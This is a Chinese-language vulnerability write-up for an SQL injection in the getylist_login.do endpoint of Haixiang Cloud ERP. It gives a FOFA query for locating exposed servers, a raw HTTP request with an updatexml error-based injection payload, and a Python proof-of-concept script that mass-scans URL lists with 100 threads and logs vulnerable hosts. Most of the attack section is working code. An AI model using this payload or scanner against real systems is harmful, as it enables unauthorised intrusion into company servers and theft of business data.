# 海翔ERP getylist_login.do SQL注入漏洞

### 漏洞描述

海翔云ERP,由成都海翔软件有限公司自主研发，拥有完全知识产权。 云ERP为企业提供 营销 + 财务 + 仓储 + 物流 整体解决方案;云ERP致力于在互联网背景下，为商贸公司提供企业级整体应用解决方案;云ERP更注重提供丰富的移动端应用，推动企业在互联网时代的经营升级

海翔云ERP getylist_login 接口处存在SQL注入漏洞，恶意攻击者可能会利用该漏洞获取服务器敏感信息，最终导致服务器失陷。

### fofa语法

```
body="checkMacWaitingSecond"
```

### 漏洞复现

```
POST /getylist_login.do HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
 
accountname=test' and (updatexml(1,concat(0x7e,(select md5(123456)),0x7e),1));--
```

![image.png](https://mazha.oss-cn-beijing.aliyuncs.com/img/202409132006214.png)

### poc脚本

~~~markdown
import argparse,sys,requests
from multiprocessing.dummy import Pool

# 禁用urllib3警告
requests.packages.urllib3.disable_warnings()

# 打印程序欢迎界面
def banner():
    test = """
██╗  ██╗ █████╗  ██████╗██╗  ██╗    ██████╗ ██╗   ██╗    ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗ 
██║  ██║██╔══██╗██╔════╝██║ ██╔╝    ██╔══██╗╚██╗ ██╔╝    ████╗ ████║██╔══██╗╚══███╔╝██║  ██║██╔══██╗
███████║███████║██║     █████╔╝     ██████╔╝ ╚████╔╝     ██╔████╔██║███████║  ███╔╝ ███████║███████║
██╔══██║██╔══██║██║     ██╔═██╗     ██╔══██╗  ╚██╔╝      ██║╚██╔╝██║██╔══██║ ███╔╝  ██╔══██║██╔══██║
██║  ██║██║  ██║╚██████╗██║  ██╗    ██████╔╝   ██║       ██║ ╚═╝ ██║██║  ██║███████╗██║  ██║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═════╝    ╚═╝       ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝                                                                                      
                                                             version:1.1.0
                                                             author:mazha.top                                    
    """
    print(test)

# 主函数
def main():
    banner() # 打印欢迎界面
    parser = argparse.ArgumentParser(description="海翔ERP SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='File Path')
    args = parser.parse_args()

    # 如果提供了url而没有提供文件路径
    if args.url and not args.file:
        poc(args.url)
    # 如果提供了文件路径而没有提供url
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100) # 创建一个线程池，最大线程数为100
        mp.map(poc,url_list) # 映射poc函数到url列表，并行执行
        mp.close() # 关闭线程池
        mp.join() # 等待所有线程执行完毕
    else:
        print(f"Uage:\n\t python3 {sys.argv[0]} -h")

# 漏洞检测函数
def poc(target):
    # 构造payload的url
    payload_url = '/getylist_login.do'
    url = target + payload_url
    headers = {
        'Content-Type':'application/x-www-form-urlencoded',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
        'Content-Length':'0',
    }
    data = "accountname=test' and (updatexml(1,concat(0x7e,(select md5(123456)),0x7e),1));--+"

    try:
        res = requests.post(url=url,headers=headers,data=data,timeout=5,verify=False)
        if res.status_code == 500 and "e10adc3949ba59abbe56e057f20f883" in res.text:
            print(f"[+]该网站存在SQL注入漏洞，url为{target}")
            with open("result.txt","a",encoding="utf-8") as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]该网站不存在SQL注入漏洞，url为{target}")

    except Exception as e:
        print(f"[*]该网站无法访问，url为{target}")

# 程序入口
if __name__ == '__main__':
    main()
~~~

### py脚本使用

```
python3 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
python3 脚本文件名 -f url.txt             # 测试多个url
```

